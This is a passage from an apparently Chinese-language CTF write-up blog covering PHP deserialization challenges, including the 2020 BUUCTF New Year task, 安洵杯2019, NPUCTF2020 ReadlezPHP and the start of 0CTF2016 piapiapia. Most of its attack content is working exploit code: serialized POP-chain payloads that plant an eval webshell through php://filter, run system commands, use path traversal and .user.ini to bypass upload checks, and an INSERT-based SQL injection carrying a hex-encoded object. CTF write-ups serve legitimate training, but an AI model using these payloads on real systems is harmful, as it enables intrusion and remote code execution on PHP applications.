class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store,$key,$expire</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=$key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire=$expire;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=$store;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>]=<span class="string">&#x27;base64_decode&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A($b,<span class="string">&#x27;eval.php&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache=<span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete=base64_encode(<span class="string">&#x27;abc&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>));</span><br><span class="line"><span class="comment">//必须添加三个字符使得shell之前的字符串进行base64解码时不影响到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>这里还要了解base64解码特点，base64解码的合法字符只包括<code>[a-zA-Z1-9]+/</code>这64个字符。</p><ul><li>编码时：把<strong>明文每8位按6位查表转码</strong>，不足的位数用<code>=</code>补0</li><li>解码时：忽略<code>[&quot;,:</code>等64个字符之外的字符，然后逆运算就行</li></ul><p>所以要求编码为4的倍数，由于shell前面的字符串中存在的base64编码有效字符只有<code>php//000000000000exit</code>21个字符，因此应该在shell前补上3个有效字符。</p><h2 id="2020-新春红包题">[2020 新春红包题]</h2><p>和上一题类似，在文件名那里做了两个处理，一是文件名包含随机字符，第二点是限制了<code>.php</code>后缀。</p><h3 id="解法1">解法1</h3><p>直接写命令，生成flag文件。</p><p>参见安全客文章:<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先autosave要为0，<code>$testB-&gt;options['serialize']</code>要为system函数，此时我们对最后的写文件没什莫要求了，但必须要执行到<code>$data = $this-&gt;serialize($value);</code>这步，<code>$testA-&gt;cache</code>要为system要执行的命令。</p><h3 id="解法2">解法2</h3><p>对于前面的随机值，使用/…/即可截断，时间戳将会被认为一个目录，后面即可追加写任意文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="解法3">解法3</h3><p>先可以利用跨目录，这样就可以不去爆破文件名，再利用.user.ini绕过后缀名限制。</p><p>上传图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>再上传.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="参考">参考</h3><p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p><p><a href="https://www.moonback.xyz/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/">moonback</a></p><h2 id="安洵杯2019-不是文件上传">[安洵杯2019]不是文件上传</h2><h3 id="考点-v7">考点</h3><ul><li>源码泄露</li><li>insert注入</li><li>PHP反序列化</li></ul><h3 id="解题-v7">解题</h3><p>在主页的源码下方有一个开发人员留的信息：<code>wowouploadimage</code>, github搜索这个名称，即可找到源码。</p><p>大概就三个功能：上传、查看、删除。</p><p>查看源码，发现有一个<code>__destruct()</code>函数，以及<code>file_get_content</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params">$path</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再找反序列化触发的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.$row[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.$row[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.$row[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第14行反序列化的值是从数据库中取出的，而序列化的值是图片的长宽，不可控，因此只能尝试SQL注入将attr属性替换掉。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">&quot;`&quot;</span>.$key_temp.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">$sql_val[] = <span class="string">&quot;&#x27;&quot;</span>.$value_temp.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_fields)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,$sql_val)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filename字段直接可控，可以在上传图片时修改filename实现注入。</p><p>先生成payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot; * ifview&quot;;b:1;s:9:&quot; * config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>由于存在替换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$attr_temp = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), $row[<span class="string">&quot;attr&quot;</span>]);</span><br></pre></td></tr></table></figure><p>所以把payload变为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>因为上传的文件名中不能有双引号，所以将payload进行16进制编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure><p>原来的插入语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>传入title的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</span><br></pre></td></tr></table></figure><p>insert注入后</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> images (<span class="string">`title`</span>,<span class="string">`filename`</span>,<span class="string">`ext`</span>,<span class="string">`path`</span>,<span class="string">`attr`</span>) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">&#x27;1.jpg&#x27;</span>,<span class="string">&#x27;a.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;pic/a.jpg&#x27;</span>,<span class="string">&#x27;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>实际上插入了两条数据，取出的时候就会反序列化传入的数据。访问show.php得到flag。</p><h2 id="NPUCTF2020-ReadlezPHP">[NPUCTF2020]ReadlezPHP</h2><h3 id="考点-v8">考点</h3><ul><li>PHP反序列化</li></ul><h3 id="解题-v8">解题</h3><p>打开题目直接查看源码，发现有一个<code>time.php?source</code>，访问即得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>比较简单的反序列化题目，生成payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$t-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$t-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$ut = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $ut;</span><br></pre></td></tr></table></figure><p>然后全局搜索flag。</p><h3 id="后记-v2">后记</h3><p>一开始我使用eval和phpinfo()无法执行 ，报错eval函数没有定义，去<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php">StackOverflow</a>上一看，说是eval不能用于动态函数。简单来说就是：</p><p>eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p><blockquote><p>什么是可变函数？</p><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require，eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p></blockquote><p>所以：</p><ul><li>eval是语言构造器而不是一个函数，不能被可变函数调用</li><li>在php7.1版本之后 assert()默认不再可以执行代码</li></ul><h2 id="0CTF2016-piapiapia">[0CTF2016]piapiapia</h2><h3 id="考点-v9">考点</h3><ul><li>数组绕过</li><li>PHP反序列化字符逃逸</li></ul><h3 id="解题-v9">解题</h3><p><code>www.zip</code>下载源码，一共有6个PHP文件，其中比较重要的就下面这几个文件。</p><p>很明显flag在<code>config.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>profile.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>update.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] 